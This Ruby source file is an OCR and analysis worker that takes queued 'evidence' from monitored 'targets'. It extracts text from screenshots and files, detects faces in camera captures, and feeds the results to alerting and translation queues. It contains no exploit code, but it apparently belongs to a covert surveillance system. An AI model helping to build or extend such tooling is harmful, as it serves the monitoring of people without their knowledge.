#
# OCR processing module
#
# the evidence to be processed are queued by the workers
#

require_relative 'leadtools'
require_relative 'tika'
require_relative 'facereco'

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

module RCS
module OCR

class Processor
  extend RCS::Tracer

  @@status = 'Starting...'

  def self.status
    @@status
  end

  def self.run
    trace :info, "OCR ready to go..."

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (queued = OCRQueue.get_queued)
        entry = queued.first
        count = queued.last
        @@status = "Processing #{count} evidence in queue"
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        @@status = 'Idle...'
        sleep 1
      end
    end
  rescue Interrupt
    trace :info, "System shutdown. Bye bye!"
    return 0
  rescue Exception => e
    trace :error, "Thread error: #{e.message}"
    trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
    retry
  end


  def self.process(entry)
    ev = Evidence.target(entry['target_id']).find(entry['evidence_id'])

    start = Time.now

    temp = RCS::DB::Config.instance.temp(ev[:data]['_grid'].to_s)
    output = temp + '.ocr'

    # dump the binary to the temp directory
    file = RCS::DB::GridFS.get ev[:data]['_grid'], entry['target_id']
    File.open(temp, 'wb') {|d| d.write file.read}
    size = File.size(temp)

    trace :debug, "#{ev.type.upcase}: #{temp} (#{size.to_s_bytes})"

    processed = false

    case ev.type
      when 'screenshot'
        # invoke the ocr on the temp file and get the result
        processed = LeadTools.transform(temp, output)
        update_evidence_data_body(ev, output, processed)
        # search for faces in screenshots
        #processed = FaceRecognition.detect(temp)
        #update_evidence_data_face(ev, processed) if processed.has_key? :face
      when 'file'
        trace :debug, "Extracting text from: #{File.basename(ev.data['path'])}"
        # invoke the text extractor on the temp file and get the result
        processed = Tika.transform(temp, output)
        update_evidence_data_body(ev, output, processed)
      when 'camera'
        # find if there is a face in the picture
        processed = FaceRecognition.detect(temp)
        if processed.has_key? :face
          update_evidence_data_face(ev, processed)
          IntelligenceQueue.add(entry['target_id'], ev.id, :evidence)
        end
    end

    FileUtils.rm_rf temp

    trace :info, "Evidence processed in #{Time.now - start} seconds - #{ev.type} #{size.to_s_bytes}"

    # check if there are matching alerts for this evidence
    RCS::DB::Alerting.new_evidence(ev)

    # add to the translation queue
    TransQueue.add(entry['target_id'], ev._id) if LicenseManager.instance.check :translation

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    trace :error, e.backtrace.join("\n")
    FileUtils.rm_rf temp
    FileUtils.rm_rf output
    #FileUtils.mv temp, temp + '.jpg'
    #exit!
  end

  def self.update_evidence_data_body(ev, output, processed)
    raise "unable to process" unless processed
    raise "output file not found" unless File.exist?(output)

    ocr_text = File.open(output, 'r') { |f| f.read }

    FileUtils.rm_rf output

    # take a copy of evidence data (we need to do this to trigger the mongoid save)
    data = ev[:data].dup
    # remove invalid UTF-8 chars
    data[:body] = ocr_text.remove_invalid_chars

    # update the evidence with the new text
    ev[:data] = data
    ev[:kw] += ocr_text.keywords

    trace :info, "Text size is: #{data[:body].size.to_s_bytes}"

    ev.save
  end

  def self.update_evidence_data_face(ev, processed)
    raise "unable to process" unless processed

    # take a copy of evidence data (we need to do this to trigger the mongoid save)
    data = ev[:data].dup
    data.merge! processed

    trace :info, "Face recognition output: #{processed.inspect}"

    # update the evidence with the new parameters
    ev[:data] = data
    ev.save
  end

end

end #OCR::
end #RCS::